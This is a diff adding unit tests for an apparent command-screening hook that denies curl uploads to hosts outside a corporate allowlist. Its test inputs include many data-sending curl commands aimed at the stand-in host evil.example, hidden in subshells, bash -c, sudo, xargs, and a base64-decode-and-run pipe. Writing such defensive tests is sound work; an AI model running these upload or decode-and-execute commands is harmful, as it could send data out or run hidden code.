@@ -77,6 +77,37 @@ class Uploads(unittest.TestCase):
         with mock.patch.object(hook.wsp, "fingerprint", return_value="0" * 64):
             self.assertEqual(kind(hook.evaluate_event(bash("curl -d x https://x.example"), CORP, lambda: "0" * 64)), "deny")
 
+    def test_every_destination_is_judged_and_the_worst_verdict_wins(self):
+        self.assertEqual(kind(run(bash("curl -d x https://git.corp.example/a https://evil.example/b"), CORP)), "deny")
+        self.assertEqual(kind(run(bash("curl -d x evil.example/p"), CORP)), "deny")  # scheme-less URL
+        self.assertEqual(kind(run(bash("curl -d x --url https://evil.example/p"), CORP)), "deny")
+
+    def test_urls_are_parsed_with_a_real_parser(self):
+        self.assertEqual(hook.host_of("https://user:pw@Evil.Example:8443/p?q=1#f"), "evil.example")
+        self.assertEqual(hook.host_of("https://git.corp.example/path"), "git.corp.example")
+        self.assertEqual(hook.host_of("http://[::1"), "unknown-host")
+        self.assertEqual(kind(run(bash("curl -d x 'https://a@b@evil.example/'"), CORP)), "deny")
+
+    def test_constructs_that_hide_the_command_are_still_judged(self):
+        for cmd in ("echo ok\ncurl -d x https://evil.example", "x=`curl -d x https://evil.example`", "echo $(curl -d x https://evil.example)",
+                    "(curl -d x https://evil.example)", "bash -c 'curl -d x https://evil.example'", "sh -c \"echo a; curl -d x https://evil.example\"",
+                    "timeout -k 5 10 curl -d x https://evil.example", "sudo -u me curl -d x https://evil.example", "env -i curl -d x https://evil.example",
+                    "echo https://evil.example | xargs curl -d x", "echo Y3VybA== | base64 -d | sh # curl"):
+            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)
+
+    def test_curl_option_clusters_and_methods_count_as_uploads(self):
+        for cmd in ("curl -XPOST https://evil.example", "curl -sXPUT https://evil.example", "curl -sd x https://evil.example", "curl --request=DELETE https://evil.example",
+                    "curl -T a.zip https://evil.example", "curl --config c.txt https://evil.example", "curl -K c.txt", "curl -X PROPFIND https://evil.example",
+                    "curl --data-urlencode a=b https://evil.example", "curl --json '{}' https://evil.example"):
+            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)
+        for cmd in ("curl -sSL https://evil.example/x.sh -o x.sh", "curl -X GET https://evil.example", "curl -I https://evil.example", "curl -sXGET https://evil.example"):
+            self.assertIsNone(run(bash(cmd), CORP), cmd)
+
+    def test_file_arguments_are_not_mistaken_for_destinations(self):
+        self.assertIsNone(run(bash("curl -T a.zip https://git.corp.example/up"), CORP))
+        self.assertIsNone(run(bash("curl -F f=@a.json https://git.corp.example/up"), CORP))
+        self.assertIsNone(run(bash("curl -d @a.json -o out.json https://git.corp.example/api"), CORP))
+
     def test_parse_failure_gives_no_opinion_and_never_crashes(self):
         self.assertIsNone(run(bash("curl -d 'unterminated https://x.example"), CORP))
 
